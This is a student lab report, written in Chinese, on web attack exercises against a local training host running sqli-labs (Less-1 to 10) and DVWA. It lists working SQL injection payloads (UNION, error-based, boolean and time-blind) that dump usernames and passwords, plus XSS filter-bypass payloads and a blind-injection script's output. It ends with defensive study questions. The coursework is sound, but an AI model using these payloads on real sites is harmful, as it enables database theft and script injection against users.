---
title: "实验八_WEB攻防实验报告"
lastmod: 2026-06-15T14:41:35+08:00
draft: false
---
# 实验八 WEB 攻防实验报告

> 靶机地址：`192.168.70.144`
>
> 本版完成：`sqli-labs Less-1 ~ Less-10`、`DVWA XSS Reflected / Stored Low-Medium-High`。
>
> 本版暂不完成：`upload-labs` 文件上传部分，后续单独补充。
>
> 截图目录：`report_screenshots/`

## 1. 判断

本实验环境为授权靶场环境，Web 服务运行在靶机 `192.168.70.144:80`。使用 Kali 虚拟机确认开放端口如下：

```bash
nmap -Pn -p 80,8080,8000,8081,8888,3306 --open 192.168.70.144
```

确认结果：

```text
80/tcp   open  http
3306/tcp open  mysql
```

可访问路径：

```text
http://192.168.70.144/sqli-labs/
http://192.168.70.144/upload-labs/
http://192.168.70.144/dvwa/
```

其中本次先完成 SQL 注入和 XSS，文件上传暂不做。

## 2. 关键线索

- `sqli-labs Less-1 ~ Less-4`：页面存在直接回显，适合使用 `UNION SELECT` 获取数据库名、表名、字段名和用户数据。
- `sqli-labs Less-5 ~ Less-6`：页面不直接回显查询字段，但显示数据库错误，适合使用 `updatexml()` 或 `extractvalue()` 报错注入。
- `sqli-labs Less-7 ~ Less-8`：页面可通过 True/False 响应差异判断条件真假，适合布尔盲注。
- `sqli-labs Less-9 ~ Less-10`：页面真假内容基本一致，适合用 `sleep()` 做时间盲注。
- `DVWA XSS Reflected`：输入来自 URL 参数 `name`，响应页面立即触发。
- `DVWA XSS Stored`：输入写入留言板，后续访问页面时触发，具有持久化特点。

## 3. 解题步骤

### 3.1 SQL 注入基础实验：Less-1 至 Less-4

Less-1 为单引号字符型注入，核心闭合方式是 `'`，先用 `order by` 判断字段数，再用 `union select` 回显数据。

![Less-1 order by 判断字段数](report_screenshots/less1_order_by.png)

读取表名：

![Less-1 获取表名](report_screenshots/less1_tables.png)

读取字段名：

![Less-1 获取字段名](report_screenshots/less1_columns.png)

读取用户数据：

![Less-1 获取用户数据](report_screenshots/less1_users.png)

Less-2 为数字型注入，不需要引号闭合：

![Less-2 数字型注入](report_screenshots/less2_users.png)

Less-3 为 `('$id')` 结构，需要使用 `')` 闭合：

![Less-3 单引号加括号闭合](report_screenshots/less3_users.png)

Less-4 为 `("$id")` 结构，需要使用 `")` 闭合：

![Less-4 双引号加括号闭合](report_screenshots/less4_users.png)

### 3.2 SQL 注入报错实验：Less-5 至 Less-6

Less-5 使用单引号闭合，页面会显示 MySQL 报错，因此使用 `updatexml()` 将查询结果拼接到 XPath 错误信息中。

![Less-5 updatexml 获取数据库名](report_screenshots/less5_error_db.png)

![Less-5 extractvalue 获取用户字段片段](report_screenshots/less5_error_users.png)

Less-6 使用双引号闭合，报错注入方法相同，只需要把闭合符从 `'` 改成 `"`。

![Less-6 updatexml 获取数据库名](report_screenshots/less6_error_db.png)

![Less-6 extractvalue 获取用户字段片段](report_screenshots/less6_error_users.png)

### 3.3 SQL 布尔盲注实验：Less-7 至 Less-8

Less-7 常见闭合为 `'))`。当条件为真时页面出现 `You are in`，条件为假时页面内容不同或报错。

![Less-7 True 条件](report_screenshots/less7_bool_true.png)

![Less-7 False 条件](report_screenshots/less7_bool_false.png)

Less-8 常见闭合为 `'`。通过判断 `ascii(substr(database(),1,1))` 的真假，可以逐字符枚举数据库名。

![Less-8 True 条件](report_screenshots/less8_bool_true.png)

![Less-8 False 条件](report_screenshots/less8_bool_false.png)

自动化脚本为：

```bash
python less8_bool_extract_database.py --max-len 16
```

运行结果：

```text
[+] pos=01 char='s' current=s
[+] pos=02 char='e' current=se
[+] pos=03 char='c' current=sec
[+] pos=04 char='u' current=secu
[+] pos=05 char='r' current=secur
[+] pos=06 char='i' current=securi
[+] pos=07 char='t' current=securit
[+] pos=08 char='y' current=security
[+] final result: security
```

### 3.4 SQL 时间盲注实验：Less-9 至 Less-10

Less-9 使用单引号闭合。条件为真时执行 `sleep(3)`，响应明显延迟；条件为假时快速返回。

![Less-9 时间盲注 True](report_screenshots/less9_time_true.png)

![Less-9 时间盲注 False](report_screenshots/less9_time_false.png)

Less-10 使用双引号闭合，时间判断逻辑与 Less-9 相同。

![Less-10 时间盲注 True](report_screenshots/less10_time_true.png)

![Less-10 时间盲注 False](report_screenshots/less10_time_false.png)

### 3.5 DVWA 反射型 XSS

DVWA 需要登录态，不能直接用匿名 HackBar iframe 展示。因此本部分使用浏览器自动化登录 DVWA 后截图。无头浏览器无法截取原生 alert 弹窗，本报告截图中将 `alert('test')` 同步 hook 为页面顶部红色证明条，证明脚本已执行。

Low 难度无有效过滤，直接提交 `&lt;script>alert('test')&lt;/script&gt;`。

![Reflected XSS Low](report_screenshots/reflected_low.png)

Medium 难度会删除精确匹配的 `&lt;script>`，使用双写绕过。

![Reflected XSS Medium](report_screenshots/reflected_medium.png)

High 难度会正则过滤 script 标签，使用事件属性绕过。

![Reflected XSS High](report_screenshots/reflected_high.png)

### 3.6 DVWA 存储型 XSS

存储型 XSS 会把输入保存到 Guestbook 中，后续访问页面时自动触发。

Low 难度在 Message 中提交脚本即可触发。

![Stored XSS Low](report_screenshots/stored_low.png)

Medium 难度中 Message 会被处理，本实验改用 Name 字段，先将前端 `maxlength` 从 `10` 改为 `200`，再提交双写 payload。

![Stored XSS Medium](report_screenshots/stored_medium.png)

High 难度继续使用 Name 字段，使用 `&lt;img>` 的 `onerror` 事件绕过 script 标签过滤。

![Stored XSS High](report_screenshots/stored_high.png)

## 4. Payload / 脚本

### 4.1 Less-1 至 Less-4 UNION 注入

```text
Less-1:
?id=1' order by 3--+
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
?id=-1' union select 1,group_concat(username),group_concat(password) from users--+

Less-2:
?id=-1 union select 1,group_concat(username),group_concat(password) from users--+

Less-3:
?id=-1') union select 1,group_concat(username),group_concat(password) from users--+

Less-4:
?id=-1") union select 1,group_concat(username),group_concat(password) from users--+
```

### 4.2 Less-5 至 Less-6 报错注入

```text
Less-5:
?id=-1' and updatexml(1,concat('~',(select database()),'~'),1)--+
?id=-1' and extractvalue(1,concat('~',(select substr(group_concat(username),1,30) from users),'~'))--+

Less-6:
?id=-1" and updatexml(1,concat('~',(select database()),'~'),1)--+
?id=-1" and extractvalue(1,concat('~',(select substr(group_concat(username),1,30) from users),'~'))--+
```

### 4.3 Less-7 至 Less-8 布尔盲注

```text
Less-7:
?id=1')) and length(database())=8--+
?id=1')) and length(database())=7--+

Less-8:
?id=1' and ascii(substr(database(),1,1))=115--+
?id=1' and ascii(substr(database(),1,1))=120--+
```

完整自动化脚本见 `less8_bool_extract_database.py`。

### 4.4 Less-9 至 Less-10 时间盲注

```text
Less-9:
?id=1' and if(length(database())=8,sleep(3),1)--+
?id=1' and if(length(database())=7,sleep(3),1)--+

Less-10:
?id=1" and if(length(database())=8,sleep(3),1)--+
?id=1" and if(length(database())=7,sleep(3),1)--+
```

### 4.5 DVWA XSS Payload

```html
<!-- Reflected / Stored Low -->
<script>alert('test')</script>

<!-- Reflected / Stored Medium -->
<scr<script>ipt>alert('test')</script>

<!-- Reflected / Stored High -->
<img src=1 onerror=alert('test')>
```

## 5. 使用方法

### 5.1 HackBar 截图生成

使用 `ctf-hackbar-screenshot` 技巧中的脚本生成分屏截图：

```powershell
python C:\Users\zuziyi\.codex\skills\ctf-hackbar-screenshot-main\scripts\render_hackbar_screenshot.py `
  --target-url "http://192.168.70.144/sqli-labs/Less-1/?id=-1%27%20union%20select%201,database(),version()--+" `
  --body "id=-1' union select 1,database(),version()--+" `
  --output-dir "S:\study\大二下\网络攻防技术\实验八\hackbar_bundles\less1_db" `
  --screenshot "S:\study\大二下\网络攻防技术\实验八\hackbar_screenshots\less1_db.png"
```

### 5.2 布尔盲注脚本

```powershell
python .\less8_bool_extract_database.py --max-len 16
```

也可以提取其他表达式：

```powershell
python .\less8_bool_extract_database.py --sql "select user()" --max-len 32
```

## 6. 结果判断

- Less-1 至 Less-4：能够通过 `UNION SELECT` 在页面回显数据库名、表名、字段名和用户数据，说明注入成功。
- Less-5 至 Less-6：页面出现包含查询结果片段的 XPath 报错，说明报错注入成功。
- Less-7 至 Less-8：True 条件页面出现 `You are in`，False 条件页面内容不同，说明布尔盲注可用。
- Less-9 至 Less-10：True 条件触发约 3 秒延时，False 条件快速返回，说明时间盲注可用。
- 布尔盲注脚本最终提取数据库名为 `security`。
- DVWA XSS：六个难度场景均捕获到 `alert('test')` 执行证明，说明反射型和存储型 XSS 均验证成功。

## 7. 下一步

- 补做 `upload-labs` 文件上传实验，包括 pass1、pass2、pass4、pass5、pass9、pass13。
- 文件上传部分需要补充 Burp 请求包、上传成功截图、Webshell 访问验证截图和中国蚁剑连接验证截图。
- 如果需要严格的原生弹窗截图，可使用可视化浏览器手工访问本报告中的 XSS payload，再截取系统弹窗。

## 8. 思考题

### 8.1 为什么仅检查前端 JavaScript 不能有效防止恶意文件上传？

前端 JavaScript 运行在用户浏览器中，攻击者可以禁用 JS、修改 HTML 表单、使用 Burp Suite 改包，或者直接用脚本构造 HTTP 请求绕过前端限制。有效防护必须在服务端完成，包括后缀白名单、MIME 校验、文件内容校验、随机文件名、上传目录禁止脚本执行等。

### 8.2 报错注入、布尔盲注和时间盲注分别适用于什么页面反馈条件？

报错注入适用于页面显示数据库错误信息的场景，可以把查询结果拼入错误内容。布尔盲注适用于页面不直接回显数据，但真假条件会造成页面内容差异的场景。时间盲注适用于真假页面内容几乎一致的场景，通过 `sleep()` 造成响应时间差异判断条件真假。

### 8.3 反射型 XSS 与存储型 XSS 有什么差异？

反射型 XSS 的 payload 来自当前请求，通常需要诱导用户点击恶意 URL，触发一次即结束。存储型 XSS 的 payload 会保存到服务器端数据中，其他用户访问包含该数据的页面时自动触发，影响范围更大、持久性更强。

